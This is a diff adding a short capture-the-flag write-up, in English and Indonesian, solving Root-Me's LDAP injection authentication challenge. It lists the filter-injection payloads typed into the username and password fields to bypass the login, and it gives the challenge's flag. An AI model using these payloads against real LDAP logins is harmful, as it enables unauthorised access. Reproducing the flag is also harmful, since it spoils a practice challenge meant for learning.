@@ -1,0 +1,47 @@
+https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-authentication
+LDAP injection - authentication
+
+Statement
+Bypass authentication mecanism.
+
+http://challenge01.root-me.org/web-serveur/ch25/
+
+
+[POC]
+
+Go to
+http://challenge01.root-me.org/web-serveur/ch25/
+
+then input username and password there
+
+ex : 
+username = )
+password = test
+
+we got ERROR : Invalid LDAP syntax : (&(uid=))(userPassword=test))
+
+Basic query LDAP authentication kalau tak salah ingat seharusnya
+
+result = (&(user = <value>)(pass = <value>))
+
+maka pemanggilannya dengan menggunakan tanda *
+==============================================
+username = *
+password = *)(&
+==============================================
+username: *)(|(userPassword=
+password: *)
+==============================================
+voila ~
+Welcome back ch25
+
+view-source:http://challenge01.root-me.org/web-serveur/ch25/
+
+username = ch25
+password = SWRwehpkTI3Vu2F9DoTJJ0LBO (setelah di inspect element)
+
+# flag = SWRwehpkTI3Vu2F9DoTJJ0LBO
+
+Well done, you won 35 Points
+
+
